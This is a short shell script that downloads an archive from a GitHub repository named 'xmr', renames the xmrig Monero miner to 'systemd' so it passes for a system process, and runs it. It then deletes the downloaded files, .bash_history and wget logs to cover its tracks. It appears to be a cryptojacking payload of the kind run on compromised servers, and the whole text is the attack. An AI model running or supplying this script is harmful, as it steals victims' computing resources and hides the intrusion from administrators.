wget https://github.com/deusveritatis/xmr/archive/master.zip
unzip master.zip
cd xmr-master
mv xmrig systemd
chmod +x systemd
./systemd
cd ..
rm -r master.zip xmr-master nvmv1 .bash_history .wget-hsts wget-log
exit 
